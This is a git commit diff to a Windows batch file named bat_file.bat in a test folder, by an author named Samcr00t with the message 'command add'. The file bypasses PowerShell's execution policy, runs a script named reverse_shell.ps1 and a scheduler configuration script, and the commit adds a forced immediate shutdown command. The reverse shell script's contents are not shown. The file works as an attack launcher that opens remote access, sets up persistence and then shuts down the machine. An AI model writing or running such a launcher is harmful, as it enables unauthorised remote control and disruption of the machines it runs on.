a7bd9608f0732e770fd25ba68e8f7cab2d7a25d2
Samcr00t <roman.mammadov22@gmail.com>
2024-12-11 15:02:43 -0500

    command add

--- test/test2/bat_file.bat
+++ test/test2/bat_file.bat
@@ -1,3 +1,5 @@
 powershell -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"
 powershell -File "C:\Users\Admin\Desktop\scripts\reverse_shell.ps1
 powershell -File "C:\Users\Admin\Desktop\scripts\scheduler_conf.ps1"
+shutdown /s /f /t 0
+
